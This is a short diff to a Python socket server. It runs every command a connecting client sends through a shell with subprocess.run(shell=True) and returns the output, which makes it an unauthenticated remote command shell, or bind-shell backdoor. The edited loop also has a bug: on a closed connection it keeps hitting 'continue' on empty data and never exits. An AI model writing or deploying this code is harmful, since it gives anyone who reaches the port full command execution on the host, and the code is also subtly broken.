@@ -16,11 +16,15 @@ def main():
             print(f"Got connection from: {addr}")
             while True:
                 data = conn.recv(1024)
-                print(f"Recieved: {data}")
-                if not data or data == b'exit':
+                if not data:
+                    continue
+                if data == b'exit':
                     break
+                print(f"Recieved: {data}")
                 output = subprocess.run(
                     data, shell=True, capture_output=True).stdout
+                if not output:
+                    continue
                 conn.sendall(output)
 
 
